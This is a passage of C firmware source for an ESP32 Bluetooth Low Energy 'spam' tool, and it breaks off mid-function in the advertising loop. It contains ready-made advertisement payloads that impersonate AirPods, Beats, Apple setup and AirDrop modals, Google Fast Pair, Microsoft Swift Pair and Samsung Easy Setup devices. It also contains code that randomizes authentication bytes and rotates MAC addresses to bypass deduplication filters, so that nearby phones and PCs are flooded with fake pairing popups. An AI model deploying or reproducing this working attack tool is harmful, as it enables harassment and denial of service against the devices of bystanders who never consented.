#include "bt_spam.h"
#include <string.h>
#include "gap_dispatcher.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_err.h"
#include "esp_gap_ble_api.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

static const char* TAG = "bt_spam";

static bt_spam_cb_display display_records_cb = NULL;
static volatile bool running_task = false;
static volatile bool is_advertising_active = false;
static int adv_index = 0;
static TaskHandle_t adv_task_handle = NULL;
static SemaphoreHandle_t adv_sem = NULL;
static volatile esp_gap_ble_cb_event_t expected_event = 0;
static volatile esp_bt_status_t last_event_status = ESP_BT_STATUS_SUCCESS;
static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;
static bool bt_controller_initialized = false;
static bool bluedroid_initialized = false;
static bool gap_callback_registered = false;

/* Chained GAP callback for other modules (e.g., bt_gattc) */
static esp_gap_ble_cb_t chained_gap_cb = NULL;

static uint32_t cycle_count = 0;
static uint32_t last_heap_log_cycle = 0;
static size_t min_free_heap_during_spam = 0;

/*
 * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms
 * (0x20) and is required for Apple proximity/continuity modals, Android Fast
 * Pair, and Windows Swift Pair.
 */
static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min = 0x20, /* 20ms */
    .adv_int_max = 0x30, /* 30ms */
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

typedef enum {
  SPAM_TYPE_APPLE_PROXIMITY,
  SPAM_TYPE_APPLE_ACTION,
  SPAM_TYPE_GOOGLE_FAST_PAIR,
  SPAM_TYPE_MICROSOFT_SWIFT,
  SPAM_TYPE_SAMSUNG_SETUP,
} spam_packet_type_t;

typedef struct {
  const char* name;
  spam_packet_type_t type;
  uint8_t len;
  uint8_t data[31];
} spam_model_t;

/*
 * SAMSUNG EASY SETUP (Company ID 0x0075) - formatos verificados contra
 * simondankelmann/Bluetooth-LE-Spam (generadores EasySetupWatch/EasySetupBuds,
 * IDs originales de Flipper-XFW easysetup.c). El magic es fijo: solo cambia el
 * id de modelo/color al final del prefijo. La variacion anti-dedup la aporta
 * la rotacion de MAC aleatoria que ya hace el ciclo de advertising.
 *
 *   Watch: [0e ff 75 00] 01 00 02 00 01 01 ff 00 00 43 <watch_id>
 *   Buds:  [1b ff 75 00] 42 09 81 02 14 15 03 21 01 09 <a> <b> 01 <c>
 *                        06 3c 94 8e 00 00 00 00 c7 00
 */
#define SPAM_SAMSUNG_WATCH(id, model_name)                                 \
  {                                                                        \
      .name = model_name,                                                  \
      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
      .len = 15,                                                           \
      .data = {0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, \
               0xff, 0x00, 0x00, 0x43, id},                                \
  }

#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                             \
  {                                                                        \
      .name = model_name,                                                  \
      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
      .len = 28,                                                           \
      .data = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, \
               0x03, 0x21, 0x01, 0x09, a,    b,    0x01, c,    0x06, 0x3c, \
               0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00},            \
  }

static const spam_model_t spam_models[] = {
    /* =========================================================================
     * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
     * =========================================================================
     */
    {
        .name = "Apple AirPods 1",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 3",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Max",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Solo Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Flex",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Fit Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds+",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 2. APPLE CONTINUITY / NEARBY ACTION MODALS - Type 0x10
     * =========================================================================
     */
    {
        .name = "AppleTV Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x20, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Transfer Number",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x27, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AirDrop Modal",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x09, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "HomePod Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x0d, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Keyboard",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x05, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple Watch Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Setup New Phone",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x2b, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Audio",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x13, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level (-21
     * dBm)
     * =========================================================================
     */
    {
        .name = "Google Pixel Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0x28, 0x03, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds Pro",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x71, 0x8f, 0xa4, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds A-Series",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xa6, 0xb7, 0x96, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Samsung Galaxy Buds FP",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xee, 0x49, 0x23, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WH-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x01, 0x82, 0x1e, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WF-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x27, 0x18, 0x00, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Flip 6",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xaa, 0x22, 0x11, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Bose QC35 II",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xf6, 0xc4, 0x20, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Live 300",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x0a, 0x00, 0x02, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "OnePlus Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0xa9, 0xc4, 0x02, 0x0a, 0xeb},
    },

    /* =========================================================================
     * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) + Beacon
     * (0x03) + Name (0x09)
     * =========================================================================
     */
    {
        .name = "MS Surface Mouse",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc2, 0x03, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
                 'a',  'c',  'e',  ' ',  'M',  'o',  'u',  's',  'e'},
    },
    {
        .name = "MS Surface Keyboard",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 27,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff,
                 0x06, 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S',  'u',
                 'r',  'f',  'a',  'c',  'e',  ' ',  'K',  'b',  'd'},
    },
    {
        .name = "MS Surface Audio",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0x42, 0x08, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
                 'a',  'c',  'e',  ' ',  'A',  'u',  'd',  'i',  'o'},
    },
    {
        .name = "Xbox Controller",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 31,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06,
                 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x10, 0x09,
                 'X',  'b',  'o',  'x',  ' ',  'C',  'o',  'n',
                 't',  'r',  'o',  'l',  'l',  'e',  'r'},
    },

    /* =========================================================================
     * 5. SAMSUNG EASY SETUP - Company ID 0x0075
     * Watch = baliza Galaxy Watch (popup "Como conectar tu reloj");
     * Buds  = EasySetup de auriculares (popup de emparejamiento Buds).
     * IDs genuinos de Flipper-XFW easysetup.c / simondankelmann.
     * =========================================================================
     */
    SPAM_SAMSUNG_WATCH(0x1a, "Fallback Watch"),
    SPAM_SAMSUNG_WATCH(0x01, "White W4 Classic 44mm"),
    SPAM_SAMSUNG_WATCH(0x02, "Black W4 Classic 40mm"),
    SPAM_SAMSUNG_WATCH(0x03, "White W4 Classic 40mm"),
    SPAM_SAMSUNG_WATCH(0x04, "Black W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x05, "Silver W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x06, "Green W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x07, "Black W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x08, "White W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x09, "Gold W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x0a, "French W4"),
    SPAM_SAMSUNG_WATCH(0x0b, "French W4 Classic"),
    SPAM_SAMSUNG_WATCH(0x0c, "Fox W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x11, "Black W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x12, "Sapphire W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x13, "Purple W5 40mm"),
    SPAM_SAMSUNG_WATCH(0x14, "Gold W5 40mm"),
    SPAM_SAMSUNG_WATCH(0x15, "Black W5 Pro 45mm"),
    SPAM_SAMSUNG_WATCH(0x16, "Gray W5 Pro 45mm"),
    SPAM_SAMSUNG_WATCH(0x17, "White W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x18, "White Black W5"),
    SPAM_SAMSUNG_WATCH(0x1b, "Black W6 Pink 40mm"),
    SPAM_SAMSUNG_WATCH(0x1c, "Gold W6 40mm"),
    SPAM_SAMSUNG_WATCH(0x1d, "Silver W6 Cyan 44mm"),
    SPAM_SAMSUNG_WATCH(0x1e, "Black W6 Classic 43mm"),
    SPAM_SAMSUNG_WATCH(0x20, "Green W6 Classic 43mm"),

    SPAM_SAMSUNG_BUDS(0xee, 0x7a, 0x0c, "Fallback Buds"),
    SPAM_SAMSUNG_BUDS(0x9d, 0x17, 0x00, "Fallback Dots"),
    SPAM_SAMSUNG_BUDS(0x39, 0xea, 0x48, "Light Purple Buds2"),
    SPAM_SAMSUNG_BUDS(0xa7, 0xc6, 0x2c, "Bluish Silver Buds2"),
    SPAM_SAMSUNG_BUDS(0x85, 0x01, 0x16, "Black Buds Live"),
    SPAM_SAMSUNG_BUDS(0x3d, 0x8f, 0x41, "Gray Black Buds2"),
    SPAM_SAMSUNG_BUDS(0x3b, 0x6d, 0x02, "Bluish Chrome Buds2"),
    SPAM_SAMSUNG_BUDS(0xae, 0x06, 0x3c, "Gray Beige Buds2"),
    SPAM_SAMSUNG_BUDS(0xb8, 0xb9, 0x05, "Pure White Buds"),
    SPAM_SAMSUNG_BUDS(0xea, 0xaa, 0x17, "Pure White Buds2"),
    SPAM_SAMSUNG_BUDS(0xd3, 0x07, 0x04, "Black Buds"),
    SPAM_SAMSUNG_BUDS(0x9d, 0xb0, 0x06, "French Flag Buds"),
    SPAM_SAMSUNG_BUDS(0x10, 0x1f, 0x1a, "Dark Purple Buds Live"),
    SPAM_SAMSUNG_BUDS(0x85, 0x96, 0x08, "Dark Blue Buds"),
    SPAM_SAMSUNG_BUDS(0x8e, 0x45, 0x03, "Pink Buds"),
    SPAM_SAMSUNG_BUDS(0x2c, 0x67, 0x40, "White Black Buds2"),
    SPAM_SAMSUNG_BUDS(0x3f, 0x67, 0x18, "Bronze Buds Live"),
    SPAM_SAMSUNG_BUDS(0x42, 0xc5, 0x19, "Red Buds Live"),
    SPAM_SAMSUNG_BUDS(0xae, 0x07, 0x3a, "Black White Buds2"),
    SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),
};

#define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))

static uint8_t active_indices[TOTAL_SPAM_MODELS];
static uint8_t active_indices_count = 0;

static bool model_matches_mode(const spam_model_t* model, bt_spam_mode_t mode) {
  switch (mode) {
    case BT_SPAM_MODE_APPLE:
      return (model->type == SPAM_TYPE_APPLE_PROXIMITY ||
              model->type == SPAM_TYPE_APPLE_ACTION);
    case BT_SPAM_MODE_ANDROID:
      return (model->type == SPAM_TYPE_GOOGLE_FAST_PAIR);
    case BT_SPAM_MODE_WINDOWS:
      return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
    case BT_SPAM_MODE_SAMSUNG:
      return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
    case BT_SPAM_MODE_ALL:
    default:
      return true;
  }
}

static void rebuild_active_indices(bt_spam_mode_t mode) {
  active_indices_count = 0;
  for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
    if (model_matches_mode(&spam_models[i], mode)) {
      active_indices[active_indices_count++] = i;
    }
  }
  if (active_indices_count == 0) {
    for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
      active_indices[i] = i;
    }
    active_indices_count = TOTAL_SPAM_MODELS;
  }
}

static void generate_random_mac(esp_bd_addr_t rand_addr) {
  esp_fill_random(rand_addr, ESP_BD_ADDR_LEN);
  /* Static random address: two MSBs must be 1 per BLE Core Spec (0xC0) */
  rand_addr[0] |= 0xC0;
}

static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
  const spam_model_t* model = &spam_models[index];
  uint8_t len = model->len;
  memcpy(out_buffer, model->data, len);

  /* Dynamic randomization of ephemeral fields to bypass deduplication filters
   */
  switch (model->type) {
    case SPAM_TYPE_APPLE_PROXIMITY:
      /* Randomize Lid counter / sequence (byte 11) and Auth tag (bytes 15-18)
       */
      out_buffer[11] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[15] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[16] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[17] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[18] = (uint8_t) (esp_random() & 0xFF);
      break;

    case SPAM_TYPE_APPLE_ACTION:
      /* Randomize auth bytes (bytes 9-14) */
      out_buffer[9] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[10] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[11] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[12] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[13] = (uint8_t) (esp_random() & 0xFF);
      out_buffer[14] = (uint8_t) (esp_random() & 0xFF);
      break;

    case SPAM_TYPE_MICROSOFT_SWIFT:
      /* In Swift Pair with Appearance: byte 13 is reserved RSSI byte, byte 12
       * is subscenario */
      break;

    case SPAM_TYPE_SAMSUNG_SETUP:
      /* Magic EasySetup fijo: en Watch los bytes 8-13 son parte de la firma
       * (01 ff 00 00 43). No randomizar nada aqui; la variacion anti-dedup
       * proviene del id de modelo y de la MAC aleatoria por ciclo. */
      break;

    case SPAM_TYPE_GOOGLE_FAST_PAIR:
    default:
      break;
  }

  return len;
}

/*
 * GAP callback. All BLE operations are asynchronous in Bluedroid.
 * The semaphore adv_sem synchronizes the control task with GAP completion
 * events.
 */
static void esp_gap_cb(esp_gap_ble_cb_event_t event,
                       esp_ble_gap_cb_param_t* param) {
  /* Handle spam module events */
  switch (event) {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
      last_event_status = param->adv_data_raw_cmpl.status;
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
      last_event_status = param->adv_start_cmpl.status;
      if (last_event_status == ESP_BT_STATUS_SUCCESS) {
        is_advertising_active = true;
      }
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
      last_event_status = param->adv_stop_cmpl.status;
      if (last_event_status == ESP_BT_STATUS_SUCCESS) {
        is_advertising_active = false;
      }
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
      last_event_status = param->set_rand_addr_cmpl.status;
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_TERMINATED_EVT:
      is_advertising_active = false;
      break;

    case ESP_GAP_BLE_UPDATE_CONN_PARAMS_EVT:
      break;

    case ESP_GAP_BLE_AUTH_CMPL_EVT:
      break;

    case ESP_GAP_BLE_SEC_REQ_EVT:
      break;

    default:
      break;
  }

  /* Forward event to chained callback (e.g., bt_gattc for scanning) */
  if (chained_gap_cb != NULL) {
    chained_gap_cb(event, param);
  }
}

/**
 * @brief Set a chained GAP callback for other modules to receive events
 * @param cb Callback to chain (can be NULL to clear)
 */
void bt_spam_set_chained_gap_cb(esp_gap_ble_cb_t cb) {
  chained_gap_cb = cb;
}

static inline void drain_sem(void) {
  if (adv_sem != NULL) {
    while (xSemaphoreTake(adv_sem, 0) == pdTRUE) {}
  }
}

static bool wait_gap_event(esp_err_t ret, TickType_t timeout) {
  if (ret != ESP_OK || adv_sem == NULL) {
    return false;
  }
  if (xSemaphoreTake(adv_sem, timeout) == pdTRUE) {
    return (last_event_status == ESP_BT_STATUS_SUCCESS);
  }
  return false;
}

/*
 * Background task: drives the advertising dwell timer and payload cycling.
 * Synchronized with Bluedroid GAP events via adv_sem.
 */
static void start_adv(void* pvParameters) {
  uint8_t payload_buffer[31];
  min_free_heap_during_spam = heap_caps_get_free_size(MALLOC_CAP_8BIT);
  uint32_t mac_rot_cycle = 0;

  esp_bd_addr_t rand_addr;
  generate_random_mac(rand_addr);
  esp_ble_gap_set_rand_addr(rand_addr);
  vTaskDelay(pdMS_TO_TICKS(20));

  while (running_task) {
    if (active_indices_count == 0) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }

    uint8_t model_idx = active_indices[adv_index];

    /* Update display immediately at cycle start */
    if (display_records_cb != NULL && running_task) {
      display_records_cb(spam_models[model_idx].name);
    }

    /* Heap monitoring - log every 100 cycles (~25 seconds at 250ms/cycle) */
    cycle_count++;
    if (cycle_count - last_heap_log_cycle >= 100) {
      size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
      size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
      size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
      if (free_heap < min_free_heap_during_spam) {
        min_free_heap_during_spam = free_heap;
      }
      float fragmentation = 0.0f;
      if (free_heap > 0) {
        fragmentation = ((float)(free_heap - largest_block) / (float)free_heap) * 100.0f;
      }
      ESP_LOGI(TAG, "Heap: free=%zu KB, min=%zu KB, largest=%zu KB, frag=%.1f%%",
               free_heap / 1024, min_free / 1024, largest_block / 1024, fragmentation);
      last_heap_log_cycle = cycle_count;
    }

    /* 1. Periodic MAC rotation every 8 cycles (~2s) with clean settling */
    if (++mac_rot_cycle >= 8) {
      mac_rot_cycle = 0;
      if (is_advertising_active) {
        drain_sem();
        esp_ble_gap_stop_advertising();
        wait_gap_event(ESP_OK, pdMS_TO_TICKS(50));
        is_advertising_active = false;
        vTaskDelay(pdMS_TO_TICKS(15));
      }
      generate_random_mac(rand_addr);
      drain_sem();
      esp_ble_gap_set_rand_addr(rand_addr);
      wait_gap_event(ESP_OK, pdMS_TO_TICKS(50));
      vTaskDelay(pdMS_TO_TICKS(15));
    }

    if (!running_task) {
      break;
    }

    /* 2. Prepare payload with dynamic randomized ephemeral fields */
    uint8_t payload_len = prepare_payload(model_idx, payload_buffer);

    /* 3. Configure advertising payload on the fly */
    drain_sem();
    esp_err_t ret = esp_ble_gap_config_adv_data_raw(payload_buffer, payload_len);
    if (ret == ESP_OK) {
      wait_gap_event(ret, pdMS_TO_TICKS(50));
    }

    if (!running_task) {
      break;
    }

    /* 4. Start advertising if not active */
    if (!is_advertising_active && running_task) {
      drain_sem();
